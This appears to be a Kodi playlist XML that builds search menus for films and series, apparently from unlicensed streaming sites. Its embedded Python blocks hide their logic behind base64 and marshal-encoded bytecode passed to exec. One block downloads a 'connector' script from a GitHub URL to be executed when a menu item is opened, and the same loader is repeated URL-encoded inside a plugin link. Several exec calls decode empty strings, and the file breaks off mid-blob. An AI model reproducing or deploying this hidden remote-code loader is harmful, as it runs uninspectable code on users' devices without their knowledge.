<?xml version="1.0" encoding="UTF-8" standalone="yes"?>


<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Buscador [COLOR white]Pidepalomitas[/COLOR]</title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[makelist2.param3]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/r6aXooD.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
</item>


<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Buscador [COLOR white]Cine HD[/COLOR]</title>
<link>CRISTAL</link>
<jsonrpc>plugin://plugin.video.cristalazul/?iconimage=https%3a%2f%2fi.imgur.com%2fAqhr7Ig.jpg&amp;mode=17&amp;regexs=%7bu%27finalhdfull%27%3a%20%7b%27expres%27%3a%20u%22%23%24pyFunction%5cr%5cnimport%20re%2crequests%2cbase64%2cxbmc%2cxbmcaddon%2cjson%2cxbmcgui%2curllib2%5cr%5cndef%20GetLSProData(page_data%2c%20Cookie_Jar%2c%20m)%3a%5cr%5cn%5cr%5cn%20%20return%20re.split(%27%5c%5cn%2a%3f%27%2c%20urllib2.urlopen(%27https%3a%2f%2fraw.githubusercontent.com%2fCristalazul%2fCristalazul.io%2fmain%2fdominios%2ffinalhdfull%27).read())%5b0%5d%5cr%5cn%5cr%5cn%22%2c%20%27name%27%3a%20u%27finalhdfull%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27reparar_conectores%27%3a%20%7b%27expres%27%3a%20u%22%23%24pyFunction%5cr%5cndef%20GetLSProData(page_data%2cCookie_Jar%2cm)%3a%5cr%5cn%20%20%20%20import%20urllib2%5cr%5cn%20%20%20%20return%20urllib2.urlopen(%27https%3a%2f%2fraw.githubusercontent.com%2fCristalazul%2fCristalazul.io%2fmain%2fCONECTORES%2fconector.a.distancia.definitivo%27).read()%5cr%5cn%22%2c%20%27name%27%3a%20u%27reparar_conectores%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27selecion_inteligente%27%3a%20%7b%27expres%27%3a%20u%22%23%24pyFunction%5cr%5cnurl%20%3d%20%27%5bpeli.param1%5d%27%5cr%5cn%24doregex%5bimportar%5d%5cr%5cnfrom%20resolveurl.plugins.lib%20import%20jsunpack%5cr%5cn%24doregex%5breparar_conectores%5d%5cr%5cn%5cr%5cn%22%2c%20%27name%27%3a%20u%27selecion_inteligente%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27makelist2%27%3a%20%7b%27listrepeat%27%3a%20u%27%5cr%5cn%3ctitle%3e%5bCOLOR%20white%5d%5bmakelist2.param6%5d%20%5bCOLOR%20aqua%5d(%2a%5bmakelist2.param3%5d%5bmakelist2.param4%5d)%5b%2fCOLOR%5d%3c%2ftitle%3e%5cr%5cn%3cinfo%3e%5bCOLOR%20white%5d%5bCAPITALIZE%5d%5bmakelist2.param6%5d%5b%2fCAPITALIZE%5d%5b%2fCOLOR%5d%3c%2finfo%3e%5cr%5cn%3clink%3e%24doregex%5bpeli%5d%3c%2flink%3e%5cr%5cn%3cthumbnail%3ehttps%3a%2f%2fhdfull.co%5bmakelist2.param1%5d%3c%2fthumbnail%3e%5cr%5cn%3cfanart%3ehttps%3a%2f%2fi.imgur.com%2fKFAuyll.jpg%3c%2ffanart%3e%5cr%5cn%27%2c%20%27expres%27%3a%20u%27%23%24pyFunction%5cr%5cnelegir%20%3d%20%5c%27search%5c%27%5cr%5cnimport%20re%2crequests%2cbase64%2cxbmc%2cxbmcgui%2cxbmcaddon%2cshutil%5cr%5cnimport%20base64%3bexec(base64.b64decode(%%3d%22))%5cr%5cn%27%2c%20%27name%27%3a%20u%27makelist2%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27importar%27%3a%20%7b%27expres%27%3a%20u%27%23%24pyFunction%5cr%5cnimport%20base64%3bexec(base64.b64decode(%22aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp%22))%5cr%5cn%27%2c%20%27name%27%3a%20u%27importar%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27peli%27%3a%20%7b%27listrepeat%27%3a%20u%27%5cr%5cn%3ctitle%3e%24pyFunction%3a(%22%5bCOLOR%20white%5d%5bCAPITALIZE%5d%5bpeli.param4%5d%20%5bpeli.param2%5d%20%5bpeli.param3%5d%5b%2fCAPITALIZE%5d%5b%2fCOLOR%5d%22).replace(%22https%3a%2f%2f%22%2c%22%22).replace(%22http%3a%2f%2f%22%2c%22%22)%3c%2ftitle%3e%5cr%5cn%3clink%3e%24doregex%5bselecion_inteligente%5d%3c%2flink%3e%5cr%5cn%3cinfo%3e%5bCOLOR%20white%5d%5bCAPITALIZE%5d%5bpeli.param2%5d%20%5bpeli.param3%5d%5b%2fCAPITALIZE%5d%5b%2fCOLOR%5d%3c%2finfo%3e%5cr%5cn%3cthumbnail%3ehttps%3a%2f%2fhdfull.co%5bmakelist2.param1%5d%3c%2fthumbnail%3e%5cr%5cn%3cfanart%3ehttps%3a%2f%2fi.imgur.com%2fKFAuyll.jpg%3c%2ffanart%3e%5cr%5cn%27%2c%20%27expres%27%3a%20u%22%23%24pyFunction%5cr%5cnurl%20%3d%20%27%5bmakelist2.param5%5d%27%5cr%5cnimport%20re%2crequests%2cbase64%2cxbmc%2cxbmcaddon%2cjson%2cxbmcgui%2curllib2%5cr%5cn%24doregex%5bfinalhdfull%5d%5cr%5cn%22%2c%20%27name%27%3a%20u%27peli%27%2c%20%27page%27%3a%20u%27None%27%7d%7d&amp;url=%24doregex%5bmakelist2%5d</jsonrpc>
<thumbnail>https://i.imgur.com/te16GTl.png</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
</item>


<item>
<title>[COLOR gold]* [COLOR lightseagreen]Series [COLOR lightseagreen][[COLOR white]Buscador[COLOR lightseagreen]][/COLOR]</title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1ME5ROEFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT2VsRXpUa1JqTVUxNlVYcE5SRmsxVGxSTk1rNXFWVE5OYlVreVRucEtiVTE2V1RCT2VsRjRUbXBWTWs1VVdUTk9WMFV6V1ZSUk0wNUVVVEJOYWxrMVRYcEZNVTVFVlRCT1JFVXlXbFJWTlU1VVl6Rk5lbEY1VGxSVk0wMUVVbXRPYlZFeVdrUmFhMDVYUlRCYVZFMHdUbTFKTUZwRVdUQk9SRlV6VG1wU2EwNXFhM3BOZWxKcVRrUnJNMDFFVlRGT1ZFMTZUbXBaZVU1WFJUQmFSRkpyVG5wSmVrOVVTbWxPVkZFelQxUlZlVTVxVVRCYVZGVXdUa2RaTUZwVVl6Uk9WR013VDFSWk1rMTZhekpaYWxFeVRrZFZNbGxxVFhwT2JWRXdXWHBTYlU1RVNUQk9WRlpvVGtSVk1VMTZXVEZOZWxsNVdtcGpNazVVVVRKWmVsa3hUa2RKZWsxVVl6Rk9Na1Y2VDBSWk1rNXRWVEJaZWsxM1RXMVpNbGxVWkdoT01rVjVXbXBOTlUxNldUSk5lbU42VG5wRk1FNUVUWHBOZW1ONVdXcE5NazVxVlRKT1ZGa3lUakpGTTAxVVkzaE5lbXN6VG1wWmVVMTZSWGxhYWxreFRsUlJNMDFxVFRST2Fsa3pUbXBqTTAxNldYbFphazAxVG5wTk1VOUVXbXRPYlUwd1QwUk5OVTF0V1ROT2FsSnNUbFJCZWs1cVl6Sk9ha2t4VG5wak1rNXFaM3BPZW1NeVRucFplazE2U20xTmVsVXpUMFJOTVU1cVVUSk9ha3BwVGtkTk1rOVVUVFJPVkVFd1dXcGFiRTE2UlRKUFJHTXpUbnByZWsxcVVUQk9WRVY1V1dwWk5VNTZWVEZaVkZreVRtcE5NazFVWXpGTmVtTXdXWHBSTlU1NlZYcE5hbU13VGtSSk0wOVVUVFZPZWtGNlRXcE5NazVxV1hwUFZFMDBUbnBGTUZwcVRUSk9SMFV6VFZSWk1FNVVUVE5OYWxsNVRsUlJNRnBFVlhwT2Vtc3pUbXBLYVU1NlVUTk9hbVJvVFhwWk1FNXFVVEpPTWtVd1dtcFpNVTVIVlRGWlZGVjNUbFJSTWxwVVdtMU9la0V4VDBSWk1rNUVWWHBPZWsxNFRucEpNVTVxVlhkT1JHTXdUWHBLYVU1cVVURk5lazB3VG5wTmVrMVVUVE5OZWtGNlQxUmpNVTE2UlRCTmFrcHBUa1JOTTAxcVZUSk5la2t3V2xSWmVVNUhVVEJPZWtwdFRsUlpNazE2VFRCTmVsa3hUa1JOZUUxdFdURlBSR014VG0xVk1FOUVWVFJPVkdjeVdXcFJNVTF0V1RCWmVsa3hUbnBGTWs5VVVUSk9Na1V6VFVSak5FNTZhek5OYW1OM1RYcEJlazFVVFROT2JVMHpUbnBOZUUxNlRURk9WRTB4VFhwUk1scEVXVEZPZWxsNlQwUk5kMDVxWXpCWlZGVTBUbFJaTTAxRVkzbE9SMDB5VFhwS2JVNTZTVEphYWxFMFRsUlJNVTU2V1RCT2FrVXdUMFJWTkU1VVJURk9lbEpwVGxSbk1rNVVWVEJPVkdNelRsUk5ORTE2WnpGT1JGa3dUWHBWTUZwRVdtbE9iVmt5VGtSUk0wNUhXVEJaZW1NeVRrZE5NRTE2VVRKT1YwVXpUVlJOTTA1VVJUTk9lbHBxVFhwUk1FOUVUWHBPUjBWNlRucFZNMDV0VFRCT1JGbDRUa2RWTTAxcVRUTk9WR2N6VG1wUmVrNUVXWHBOZWsxNFRtcEZlazVxVFRWT2Vtc3dXbFJqTkUxNll6QmFhbFV5VG5wSmVrNXFUVFZPZWtreVQwUlNiRTVFWnpOTlZGSnNUa2RKTWs5VVdUQk9WR016VGxSVmQwMTZVWHBPVkZrd1RrUkZNRTVFV20xT1JHZDZUbFJqTkU1VVNUTlBSRlYzVGxSSmVrOVVWWHBPZWtFelRucGFhazV0VVRGTlZGVjRUVzFKTWs5VVRYaE9WRUV5V1dwUk1rNXFWWHBOYWxsNFRucG5lazFVVFRCT1ZGVXlUMVJqTWs1RVp6QmFWRmw0VGtkSmVrNVVXVFJPYWtrd1dtcFZNMDV0VlRCYVZFMHlUakpGTTA1RVdURk5lbFV4VFVSTk1VNXFTVEZPUkZVMFRrUm5NMDVVWXpCT2VsRjZUbXBOTlU1NlNUTlBSRlUwVGtSWk1GcHFVbXRPYlUxNlQxUlJNRTV0VFRKYWFrMTNUa1JuTTA1VVZUUk9SMVV6VGxSVk5VNVVUWGxaYWxWNlRYcEJlazlFVVRKTmVtY3pUMVJTYUU1RVp6SmFhbGt3VGxSVmVrNTZZelZOYlVrd1dsUlJlVTVFWnpCT1JGRXhUa2RKTWsxcVl6Qk9hazB3V2xSWmVFNVVXWHBOZW1OM1RtcFJNVTVxWkdoT1ZFa3pUbXBhYWs1RVp6Rk5la3BwVGxSTk1rOUVaR2hPYW1Nd1dtcGpORTVVUVRKTlZHTXdUbnByTUUxNlRYcE9SMFV5V1ZSak5VNUVWVEJaVkUweVRrUkZNbGxVWXpOTmVrMHlXbFJWZUU1SFRUTlBWRmt6VG5wTk1VNTZWbWhPUjFFeVRYcFJlRTU2V1ROTmVrMDBUbnBaZWsxcVVUVk9hbGt5V2xSU2FFMTZhekpPZWxwc1RsUkJNVmxVVW14T1IwMTVXbXBaTlU1NlZUQmFWRTB4VFhwWk1VOVVZM2xPZW1jeFRsUmpNMDVFYTNwTlJHTTFUWHByTTA5RVl6Qk9la2t5V1dwTk5FNXFhekJaZWsxM1RrUk5NVTVFV20xT1JFa3pUMVJOTkU1RVVUTk5lbGw1VG5wbk0wMTZXWHBPZWxreFRucFJOVTVFWXpKT2FsVXhUbXBqTTA1VVRYZE9hbU16VG1wTmVVNUVWVEJPUkZKclRtcEZNRTFxVFhkTmVsRXhUbnBOTlU1NlRUQmFWRTB4VG1wVk1FMVVXVEJPYlZFelRVUlZlazE2V1RKUFJGVXlUbnBqTUU5RVRUUk9iVWt6VDBSYWJFNXRTVEJOYWsxNVRYcGpNVTFFVFhkT1IwMHlUa1JqTTA1VVRYcE5WR04zVGtSbmVrOVVZM3BPYlUweFRrUlNhRTVxVVRGTmFrMTZUbXBaTVUxcVVtMU9la2w2VFZSUmVVNXRSVEZQUkZKb1RYcG5NMDlVVVRST2Vsa3hUMFJTYlU1NmF6Qk5lbGt5VGxSUk1FOVVUVFJPYWtsNlRXcFJNMDR5UlRCWmVsRjZUVzFaTTA5VVVtbE9SRmw2VFhwVk5FNXRUVEpaZWxwcVRrZE5NazlVWkdoT2JVVXdUa1JrYUU1dFdUQk5lazB6VG1wck1rNUVVbXBPUkZVeVdWUk5NRTE2VVhwTmVrMHlUbnByTTAxcVVYcE5lbEV6VDFSYWJFNHlSVEZOZWxWNFRYcE5NMDlVVlRKT1ZGVXdUWHBSTUUxNldUTlBWRkV3VG1wSk1GbDZVbWxPZWxVeFQxUlJNVTU2VlRCTmFsSm9UVzFaTVU1RVVUQk9WRUV6VFZSU2FVNVVZekJhVkZreVRrUk5NRTU2V214T2FrMHlUbnBTYlU1RVNUSk9hbFY1VGxSQk1VMTZVWGxPYWtrd1QxUlZNazVVUlhwTlZHTjVUakpGZVZwcVdtaE9WRUV5VG1wU2JVMTZUWHBPUkZwb1RtMUZNVTVFV214T2JWVjZUVlJqTlU1NmF6Qk9WRmt5VGxSRk1FNXFVbXBPYW1jeFQwUk5kMDVIV1RKT2VsRXlUWHBOZWs1RVVtaE9SRVV3V1hwamVrNXRSVEJhVkZrMFRsUk5NVTlFV21oT2FtTXlUbFJqTTA1VVdYbGFhbEY0VGxSQk1rMXFXWGhOZWtWNlRsUlpORTVFWnpCYWFsRXpUbnBKZWs1RVVURk9lazE2VG1wak1FMTZhekJhYWxWNFRXMVpNRmxVVFhsT1JFa3dXbXBaTVU1cVl6Tk5WRmw2VG0xVmVrOUVVbWhPYlVVeFRrUmFiVTVVVFRCUFJHTjNUbTFWTVU5RVRUQk9SRVV4VG1wWk1rMTZVVEZaVkZab1RYcEJlazFxVFRST1JGRXpUbXBhYlU1dFJUSk9hazE0VG0xWk1scFVWWHBPVjBWNlRsUk5NRTVxU1RKT2FsRjRUbTFOTVUxRVZYaE9la0V5V1ZSVmVVMTZRVEpOYWxKcVRsUkZNbGxVVlhkT1ZFVXdXbFJSTUUxdFNYcE9WRkY2VG5wVk1sbHFVVEpOYlVreFdWUmpOVTVVV1hwTmVsazFUbFJGTTA1cVRYbE5lbFV6VG5wUk1rNTZWVEJPYWsxNFRtcGpNbHBVVFhkT2VtTXdXWHBqTTA1cVVYbFphbEpzVG1wVk1VMTZVWGxPVkVGNlRsUlplazV0U1RGT2FrcHBUWHBSZWs1NlVUTk5iVWt3VFdwVmQwNUVZekJhUkZWM1RucFpNazU2VW1oT2VsRXhUVVJLYVU1NlZUQk9WRTAwVG5wck1FNVVXVEJOZWswelQxUlplazVIVlRGWlZFMDBUa1JuTUU5RVdtaE9WRmt6VDFSVmVVNVVRVEpaVkZwc1RrUlZNbGxVV1RKT2VtTXdXbFJOTlU1dFdUSk5WR013VFhwTk1rMTZZekZPUkVVd1QwUk5ORTVFUlRKT2FrMHdUbFJyZWsxVVRUTk9SRTE2VFhwS2FVNXFhekpPVkUxM1RrUlJNbHBxV1RKT1IxRXpUVVJSTUU1cVVYcE9hbFV6VFcxWmVrNUVXVEpOZWtVd1RrUlZlRTU2V1ROTlJHTjVUWHBuTVU1RVZYbE9hbXQ1V21wYWJVNXRWVEJQUkZWNlRucFJlazVVV214T2VtTXdUa1JqTVU1RVNYbGFhbFUwVG0xVk1scHFWVE5OZWxVd1RucFNiVTVxUlhsYWFsSm9Ua2ROTTAxNlVYcE5lazB6VGtSWk5VNVVRVEpPVkZWNFRrUkZNMDFFWTNsT2FtY3dUMFJaTVU1SFdUQlBWRTB6VFhwak1FNXFZekZPUjFFelRrUlJORTE2V1RGT1JGVTFUWHBOZVZwcVdtcE9iVWw2VG5wTmQwNTZXVEpQUkZGNVRsUkJNbHBFV1hoT2Vra3dXbFJqTWs1VVp6Sk9hbFV5VFhwQk1VNUVZelZPVkdjd1dWUmpNRTVFVFRCYWFrMHpUWHBCTVU5RVRYaE9SR3N4VFdwYWJFNXRXVEJOZWxVeVRYcHJNazU2VW14T2FrMHhUbFJSTlU1VVdUSk9WRkY1VGxkRmVrMUVZelJPZW1zeVdXcFNiVTE2YXpCUFZGVXdUWHBOTUZsVVVYcE9hbGt4V1ZSUk0wNUhUVEpPZWxFeFRucEJNRTlVV1RCT1ZGVXpUWHBSZWs1VVdUTk5lbEY2VGtkTmVrOUVVbXhPUjFrd1dtcGpNMDV0UlRGTmVsVXdUWHBqTUU5VVdtbE5lbXN3V1ZSTk5VNUVhekJaZWtwcFRtcG5NRmxVU20xT1YwVXhUVVJOTVU1NlVUQk5WRkpyVG1wTk1VMVVXbWhOZWxFd1RXcFJlRTV0VlRKT1JGSnJUWHBCZWsxNll6Uk9WRVV3VG1wU2FFMTZaekpPZWxKclRYcEJlazFxVFRGT1ZFRXlUbFJTYVUxNll6Tk5hazE1VFhwbk0wNTZVVFZOZWxWNlRrUmFhRTE2WjNwT2FrMTNUbnBaZVZwcVVYcE9lbU14VFVSTmVVNUVhekJhYWsweFRrZEpNRTVxWXpSTmVra3lUbnBaTWsxNlNUQmFhbGt6VGtSVk0wNXFUWGRPZWtFelRYcFJNRTE2UlhsYWFsVjRUa2RSTTA1cVRUQk9SMWt5VGtSUmVrNVVZekpOZWswMFRrZFZNazVxVlhwT1JHTXhUa1JqTVU1SFJURk9SRXB0VG0xRk1VOUVVVEpPVkVFeVRrUmFhRTVIUlhwTmVsRXlUbXBOTVUxRVVURk9WRkV4VFdwVmQwNXFTVEJhUkZKcFRrUlJlazU2WXpCT2VtTjZUbXBXYUUxNlp6Qk5lbEpyVFcxWk1GbHFZekZPZW1kNlRWUmpNazVVUlRKT1JGSnJUbXBqTUU1cVdteE5iVWt3VFdwa2FF